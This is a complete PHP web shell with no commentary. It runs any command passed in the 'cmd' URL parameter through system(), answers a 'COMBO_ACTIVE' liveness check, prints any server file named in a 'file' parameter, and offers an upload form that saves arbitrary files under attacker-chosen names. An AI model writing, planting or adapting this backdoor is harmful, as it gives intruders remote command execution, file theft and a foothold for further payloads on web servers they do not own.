<?php
if (isset($_GET['cmd'])) {
    if ($_GET['cmd'] == 'echo "COMBO_ACTIVE"') {
        echo "COMBO_ACTIVE";
        exit;
    }
    system($_GET['cmd']);
}

if (isset($_GET['file'])) {
    if (file_exists($_GET['file'])) {
        echo htmlspecialchars(file_get_contents($_GET['file']));
        exit;
    }
}

if(isset($_FILES['f'])){
    if(move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])){
        echo "Uploaded: ".$_FILES['f']['name'];
    }
}
?>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="f"><button>Upload</button>
</form>
